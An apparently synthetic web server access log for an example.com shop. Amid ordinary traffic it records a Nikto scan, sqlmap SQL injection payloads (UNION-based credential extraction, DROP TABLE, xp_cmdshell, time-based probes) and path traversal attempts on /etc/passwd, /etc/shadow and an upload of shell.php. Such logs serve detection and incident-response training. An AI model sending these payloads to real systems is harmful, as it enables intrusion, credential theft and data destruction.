10.0.1.50 - - [19/May/2026:08:03:12 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [19/May/2026:08:07:45 +0000] "GET /products HTTP/1.1" 200 8921 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.100.10 - - [19/May/2026:08:12:30 +0000] "GET /about HTTP/1.1" 200 3201 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
46.101.93.64 - - [19/May/2026:08:15:11 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.1.52 - - [19/May/2026:08:18:55 +0000] "POST /login HTTP/1.1" 200 512 "https://example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
104.21.45.67 - - [19/May/2026:08:22:04 +0000] "GET /dashboard HTTP/1.1" 200 9874 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.67.134.21 - - [19/May/2026:08:25:33 +0000] "GET /static/css/main.css HTTP/1.1" 304 0 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.50 - - [19/May/2026:08:30:17 +0000] "GET /cart HTTP/1.1" 200 5643 "https://example.com/products" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.1.51 - - [19/May/2026:08:35:09 +0000] "POST /checkout HTTP/1.1" 200 2341 "https://example.com/cart" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.100.10 - - [19/May/2026:08:40:22 +0000] "GET /api/v1/orders HTTP/1.1" 200 7823 "https://example.com/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
46.101.93.64 - - [19/May/2026:08:45:50 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0"
10.0.1.52 - - [19/May/2026:08:50:33 +0000] "GET /products HTTP/1.1" 200 8921 "-" "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
104.21.45.67 - - [19/May/2026:09:00:14 +0000] "GET /about HTTP/1.1" 200 3201 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.67.134.21 - - [19/May/2026:09:05:42 +0000] "GET /static/css/main.css HTTP/1.1" 200 45231 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.50 - - [19/May/2026:09:10:08 +0000] "POST /login HTTP/1.1" 301 0 "https://example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [19/May/2026:09:15:29 +0000] "GET /dashboard HTTP/1.1" 200 9874 "https://example.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.100.10 - - [19/May/2026:09:20:55 +0000] "GET /api/v1/orders HTTP/1.1" 200 6540 "https://example.com/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
46.101.93.64 - - [19/May/2026:09:30:11 +0000] "GET /cart HTTP/1.1" 200 5643 "https://example.com/products" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.1.52 - - [19/May/2026:09:40:37 +0000] "GET /nonexistent-page HTTP/1.1" 404 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
104.21.45.67 - - [19/May/2026:09:48:22 +0000] "GET /products HTTP/1.1" 200 8921 "https://www.bing.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.23 - - [19/May/2026:11:00:01 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000340)"
198.51.100.23 - - [19/May/2026:11:00:14 +0000] "GET /cgi-bin/printenv HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000341)"
198.51.100.23 - - [19/May/2026:11:00:28 +0000] "GET /.env HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000398)"
198.51.100.23 - - [19/May/2026:11:00:41 +0000] "GET /admin HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000412)"
198.51.100.23 - - [19/May/2026:11:00:55 +0000] "GET /wp-admin HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000413)"
198.51.100.23 - - [19/May/2026:11:01:08 +0000] "GET /phpinfo.php HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000455)"
198.51.100.23 - - [19/May/2026:11:01:22 +0000] "GET /.git/config HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000500)"
198.51.100.23 - - [19/May/2026:11:01:35 +0000] "GET /backup.sql HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000522)"
198.51.100.23 - - [19/May/2026:11:01:49 +0000] "GET /server-status HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000558)"
198.51.100.23 - - [19/May/2026:11:02:03 +0000] "GET /cgi-bin/test-cgi HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000601)"
198.51.100.23 - - [19/May/2026:11:02:17 +0000] "GET /phpmyadmin HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000634)"
198.51.100.23 - - [19/May/2026:11:02:30 +0000] "GET /config.php HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000659)"
198.51.100.23 - - [19/May/2026:11:02:44 +0000] "GET /wp-config.php HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000672)"
198.51.100.23 - - [19/May/2026:11:02:58 +0000] "GET /.htaccess HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000701)"
198.51.100.23 - - [19/May/2026:11:03:12 +0000] "GET /robots.txt HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000734)"
198.51.100.23 - - [19/May/2026:11:03:25 +0000] "GET /crossdomain.xml HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000756)"
198.51.100.23 - - [19/May/2026:11:03:39 +0000] "GET /sitemap.xml HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000778)"
198.51.100.23 - - [19/May/2026:11:03:53 +0000] "GET /etc/passwd HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000800)"
198.51.100.23 - - [19/May/2026:11:04:07 +0000] "GET /admin/config HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000823)"
198.51.100.23 - - [19/May/2026:11:04:21 +0000] "GET /cgi-bin/status HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000847)"
198.51.100.23 - - [19/May/2026:11:04:35 +0000] "GET /.svn/entries HTTP/1.1" 404 287 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000901)"
10.0.1.50 - - [19/May/2026:11:15:44 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [19/May/2026:11:22:18 +0000] "GET /products HTTP/1.1" 200 8921 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.100.10 - - [19/May/2026:11:35:50 +0000] "GET /dashboard HTTP/1.1" 200 9874 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
46.101.93.64 - - [19/May/2026:12:01:33 +0000] "GET /about HTTP/1.1" 200 3201 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.1.52 - - [19/May/2026:12:15:07 +0000] "GET /api/v1/orders HTTP/1.1" 200 7823 "https://example.com/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
104.21.45.67 - - [19/May/2026:12:30:45 +0000] "GET /static/css/main.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.67.134.21 - - [19/May/2026:12:44:22 +0000] "GET /cart HTTP/1.1" 200 5643 "https://example.com/products" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.1.50 - - [19/May/2026:13:05:11 +0000] "POST /checkout HTTP/1.1" 200 2341 "https://example.com/cart" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.1.51 - - [19/May/2026:13:20:38 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.100.10 - - [19/May/2026:13:35:59 +0000] "GET /products HTTP/1.1" 200 8921 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.17 - - [19/May/2026:14:00:05 +0000] "GET /products.php?id=1' HTTP/1.1" 500 1203 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:00:21 +0000] "GET /products.php?id=1%20AND%201=1 HTTP/1.1" 200 8921 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:00:37 +0000] "GET /products.php?id=1%20AND%201=2 HTTP/1.1" 200 512 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:00:53 +0000] "GET /products.php?id=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users-- HTTP/1.1" 500 1203 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:01:09 +0000] "GET /products.php?id=1%20UNION%20SELECT%201%2C2%2C3-- HTTP/1.1" 200 4523 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:01:25 +0000] "POST /login?user=admin'--&pass=x HTTP/1.1" 500 1203 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:01:41 +0000] "GET /api/users?filter=1%20OR%201%3D1 HTTP/1.1" 200 45231 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:01:57 +0000] "GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 8921 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:02:13 +0000] "GET /products.php?id=1%27%20AND%20SLEEP(5)-- HTTP/1.1" 200 8921 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:02:29 +0000] "GET /products.php?id=1%3B%20DROP%20TABLE%20users-- HTTP/1.1" 500 1203 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:02:45 +0000] "GET /api/v1/orders?id=1%27%20UNION%20SELECT%20NULL%2CNULL-- HTTP/1.1" 500 1203 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:03:01 +0000] "GET /products.php?cat=1%20AND%20EXTRACTVALUE(1%2CCONCAT(0x7e%2C(SELECT%20version())))-- HTTP/1.1" 500 1203 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:03:17 +0000] "GET /products.php?id=1%20ORDER%20BY%201-- HTTP/1.1" 200 8921 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:03:33 +0000] "GET /products.php?id=1%20ORDER%20BY%205-- HTTP/1.1" 500 1203 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:03:49 +0000] "GET /products.php?id=1%20ORDER%20BY%204-- HTTP/1.1" 200 8921 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:04:05 +0000] "GET /products.php?id=-1%20UNION%20SELECT%20table_name%2CNULL%2CNULL%2CNULL%20FROM%20information_schema.tables-- HTTP/1.1" 200 45231 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:04:21 +0000] "GET /products.php?id=-1%20UNION%20SELECT%20column_name%2CNULL%2CNULL%2CNULL%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27users%27-- HTTP/1.1" 200 45231 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:04:37 +0000] "GET /checkout?promo=1%27%3BINSERT%20INTO%20admins%20VALUES%28%27hacked%27%2C%27password%27%29-- HTTP/1.1" 500 1203 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:04:53 +0000] "GET /api/users?id=1%20AND%20(SELECT%20SUBSTR(username%2C1%2C1)%20FROM%20users%20LIMIT%201)%3D%27a%27-- HTTP/1.1" 200 8921 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:05:09 +0000] "GET /api/users?id=1%20AND%20(SELECT%20SUBSTR(username%2C1%2C1)%20FROM%20users%20LIMIT%201)%3D%27b%27-- HTTP/1.1" 200 512 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:05:25 +0000] "GET /search?q=test%27%20OR%20%271%27%3D%271%27%23 HTTP/1.1" 200 8921 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:05:41 +0000] "GET /products.php?id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))a) HTTP/1.1" 200 8921 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:05:57 +0000] "GET /dashboard?user=1%27%20exec%20xp_cmdshell(%27whoami%27)-- HTTP/1.1" 500 1203 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
203.0.113.17 - - [19/May/2026:14:06:13 +0000] "GET /api/v1/orders?sort=id%3BSELECT%20pg_sleep(5)-- HTTP/1.1" 200 8921 "-" "sqlmap/1.7.8#stable (https://sqlmap.org)"
10.0.1.50 - - [19/May/2026:14:15:22 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [19/May/2026:14:30:48 +0000] "GET /products HTTP/1.1" 200 8921 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.100.10 - - [19/May/2026:14:45:15 +0000] "GET /api/v1/orders HTTP/1.1" 200 7823 "https://example.com/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
46.101.93.64 - - [19/May/2026:15:00:33 +0000] "GET /dashboard HTTP/1.1" 200 9874 "https://example.com/" "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0"
10.0.1.52 - - [19/May/2026:15:15:50 +0000] "GET /checkout HTTP/1.1" 200 2341 "https://example.com/cart" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
104.21.45.67 - - [19/May/2026:15:30:07 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.67.134.21 - - [19/May/2026:15:45:24 +0000] "GET /about HTTP/1.1" 200 3201 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.1.50 - - [19/May/2026:16:00:41 +0000] "GET /cart HTTP/1.1" 200 5643 "https://example.com/products" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [19/May/2026:16:15:58 +0000] "POST /login HTTP/1.1" 200 512 "https://example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.100.10 - - [19/May/2026:16:30:15 +0000] "GET /static/css/main.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
46.101.93.64 - - [19/May/2026:16:45:32 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.1.52 - - [19/May/2026:17:00:49 +0000] "GET /products HTTP/1.1" 200 8921 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.50 - - [19/May/2026:17:30:06 +0000] "GET /api/v1/orders HTTP/1.1" 200 7823 "https://example.com/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [19/May/2026:17:45:23 +0000] "GET /dashboard HTTP/1.1" 200 9874 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.50 - - [20/May/2026:08:05:14 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [20/May/2026:08:18:39 +0000] "GET /products HTTP/1.1" 200 8921 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.100.10 - - [20/May/2026:08:32:55 +0000] "GET /dashboard HTTP/1.1" 200 9874 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
46.101.93.64 - - [20/May/2026:08:47:12 +0000] "POST /login HTTP/1.1" 200 512 "https://example.com/login" "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0"
10.0.1.52 - - [20/May/2026:09:01:28 +0000] "GET /api/v1/orders HTTP/1.1" 200 7823 "https://example.com/dashboard" "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
104.21.45.67 - - [20/May/2026:09:15:44 +0000] "GET /about HTTP/1.1" 200 3201 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.67.134.21 - - [20/May/2026:09:30:01 +0000] "GET /static/css/main.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.50 - - [20/May/2026:09:44:17 +0000] "GET /cart HTTP/1.1" 200 5643 "https://example.com/products" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [20/May/2026:09:58:33 +0000] "GET /checkout HTTP/1.1" 200 2341 "https://example.com/cart" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
203.0.113.99 - - [20/May/2026:10:30:05 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.99 - - [20/May/2026:10:30:18 +0000] "GET /%2e%2e/%2e%2e/etc/shadow HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.99 - - [20/May/2026:10:30:31 +0000] "GET /static/../../../etc/hosts HTTP/1.1" 403 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.99 - - [20/May/2026:10:30:44 +0000] "GET /images/../../../../proc/self/environ HTTP/1.1" 403 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.99 - - [20/May/2026:10:30:57 +0000] "GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 403 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.99 - - [20/May/2026:10:31:10 +0000] "GET /files?path=....//....//etc/passwd HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.99 - - [20/May/2026:10:31:23 +0000] "GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 403 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.99 - - [20/May/2026:10:31:36 +0000] "GET /api/file?name=..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.99 - - [20/May/2026:10:31:49 +0000] "GET /images/..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.99 - - [20/May/2026:10:32:02 +0000] "GET /static/%2e%2e/%2e%2e/%2e%2e/etc/mysql/my.cnf HTTP/1.1" 403 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.99 - - [20/May/2026:10:32:15 +0000] "GET /download?file=....%2F....%2F....%2Fetc%2Fpasswd HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.99 - - [20/May/2026:10:32:28 +0000] "GET /upload?dest=..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php HTTP/1.1" 403 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.99 - - [20/May/2026:10:32:41 +0000] "GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fhosts HTTP/1.1" 403 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.99 - - [20/May/2026:10:32:54 +0000] "GET /images/../../../boot.ini HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.99 - - [20/May/2026:10:33:07 +0000] "GET /static/..%2F..%2F..%2Fproc%2Fself%2Fcmdline HTTP/1.1" 403 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [20/May/2026:10:45:22 +0000] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.100.10 - - [20/May/2026:11:00:39 +0000] "GET /products HTTP/1.1" 200 8921 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
46.101.93.64 - - [20/May/2026:11:20:55 +0000] "GET /api/v1/orders HTTP/1.1" 200 7823 "https://example.com/dashboard" "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0"
10.0.1.52 - - [20/May/2026:11:40:11 +0000] "GET /dashboard HTTP/1.1" 200 9874 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
104.21.45.67 - - [20/May/2026:12:00:28 +0000] "GET /cart HTTP/1.1" 200 5643 "https://example.com/products" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.67.134.21 - - [20/May/2026:12:20:44 +0000] "POST /checkout HTTP/1.1" 200 2341 "https://example.com/cart" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.1.50 - - [20/May/2026:12:40:01 +0000] "GET /about HTTP/1.1" 200 3201 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.1.51 - - [20/May/2026:13:00:17 +0000] "GET /static/css/main.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.100.10 - - [20/May/2026:13:20:34 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
